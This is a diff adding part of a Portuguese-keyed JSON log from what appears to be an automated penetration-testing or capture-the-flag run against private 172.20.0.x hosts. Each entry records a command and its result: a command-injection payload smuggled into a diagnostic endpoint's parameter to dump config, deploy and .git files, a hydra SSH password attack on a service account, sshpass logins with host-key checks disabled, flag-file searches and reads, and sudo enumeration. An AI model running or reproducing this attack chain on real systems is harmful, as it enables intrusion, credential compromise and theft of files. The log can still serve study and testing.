+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;find / -xdev \\( -iname \"*deploy*\" -o -iname \"*.git\" -o -iname \"*config*\" \\) 2>/dev/null | grep -vE \"^/(proc|sys|usr|lib)\" | xargs -I{} sh -c \"echo ===  {}===; cat {} 2>/dev/null\" http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;find / -xdev \\( -iname \"*deploy*\" -o -iname \"*.git\" -o -iname \"*config*\" \\) 2>/dev/null | grep -vE \"^/(proc|sys|usr|lib)\" | xargs -I{} sh -c \"echo ===  {}===; cat {} 2>/dev/null\"' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1 credencial(is); saida: 9 nao guardados",
+   "revisao": 17
+  },
+  {
+   "ferramenta": "hydra",
+   "assinatura": "hydra -l svc_deploy -p **** ssh://172.20.0.12",
+   "rotulo": "hydra -l svc_deploy -p '****' ssh://172.20.0.12",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 senha(s), concluida=True",
+   "revisao": 18
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p **** ssh -o StrictHostKeyChecking=no svc_deploy@172.20.0.12 find / -xdev \\( -iname \"*trofeu*\" -o -iname \"*flag*\" \\) 2>/dev/null",
+   "rotulo": "sshpass -p '****' ssh svc_deploy@172.20.0.12 'find / -xdev \\( -iname \"*trofeu*\" -o -iname \"*flag*\" \\) 2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 1): Warning: Permanently added '172.20.0.12' (ED25519) to the list of known hosts.; falha de ssh",
+   "revisao": 19
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p **** ssh -o StrictHostKeyChecking=no svc_deploy@172.20.0.12 id",
+   "rotulo": "sshpass -p '****' ssh svc_deploy@172.20.0.12 id",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "sessao estabelecida; saida: usuario svc_deploy",
+   "revisao": 21
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p **** ssh svc_deploy@172.20.0.12 find / -xdev -iname *trofeu* -o -iname *flag* 2>/dev/null",
+   "rotulo": "sshpass -p '****' ssh svc_deploy@172.20.0.12 find / -xdev -iname '*trofeu*' '*flag*' '2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 1): /usr/share/nmap/scripts/http-cookie-flags.nse; falha de ssh",
+   "revisao": 21
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p **** ssh svc_deploy@172.20.0.12 find / -xdev \\( -iname '*trofeu*' -o -iname '*flag*' \\) 2>/dev/null",
+   "rotulo": "sshpass -p '****' ssh svc_deploy@172.20.0.12 'find / -xdev \\( -iname '\"'\"'*trofeu*'\"'\"' -o -iname '\"'\"'*flag*'\"'\"' \\) 2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 1): /usr/share/nmap/scripts/http-cookie-flags.nse; falha de ssh",
+   "revisao": 21
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p **** ssh svc_deploy@172.20.0.12 find / -xdev \\( -iname '*trofeu*' -o -iname '*flag*' \\) 2>/dev/null",
+   "rotulo": "sshpass -p '****' ssh svc_deploy@172.20.0.12 'find / -xdev \\( -iname '\"'\"'*trofeu*'\"'\"' -o -iname '\"'\"'*flag*'\"'\"' \\) 2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": true,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 1): /usr/share/nmap/scripts/http-cookie-flags.nse; falha de ssh",
+   "revisao": 21
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p **** ssh svc_deploy@172.20.0.12 find / -xdev \\( -iname \"*trofeu*\" -o -iname \"*flag*\" \\) 2>/dev/null; true",
+   "rotulo": "sshpass -p '****' ssh svc_deploy@172.20.0.12 'find / -xdev \\( -iname \"*trofeu*\" -o -iname \"*flag*\" \\) 2>/dev/null; true'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "sessao estabelecida; saida: 1 caminhos novos",
+   "revisao": 22
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p **** ssh svc_deploy@172.20.0.12 find / -xdev \\( -iname \"*trofeu*\" -o -iname \"*flag*\" \\) 2>/dev/null | xargs -I{} sh -c \"echo ===  {}===; cat {} 2>/dev/null\"; true",
+   "rotulo": "sshpass -p '****' ssh svc_deploy@172.20.0.12 'find / -xdev \\( -iname \"*trofeu*\" -o -iname \"*flag*\" \\) 2>/dev/null | xargs -I{} sh -c \"echo ===  {}===; cat {} 2>/dev/null\"; true'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "sessao estabelecida; saida: 2 caminhos novos",
+   "revisao": 23
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p **** ssh svc_deploy@172.20.0.12 cat $(find / -xdev -iname \"*trofeu*\" -o -iname \"*flag*\" 2>/dev/null) 2>/dev/null; true",
+   "rotulo": "sshpass -p '****' ssh svc_deploy@172.20.0.12 'cat $(find / -xdev -iname \"*trofeu*\" -o -iname \"*flag*\" 2>/dev/null) 2>/dev/null; true'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "sessao estabelecida; saida: nenhum fato novo",
+   "revisao": 23
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p **** ssh svc_deploy@172.20.0.12 sudo -l; true",
+   "rotulo": "sshpass -p '****' ssh svc_deploy@172.20.0.12 'sudo -l; true'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "sessao estabelecida; saida: nenhum fato novo",
+   "revisao": 23
+  }
+ ],
+ "revisao": 23
+}
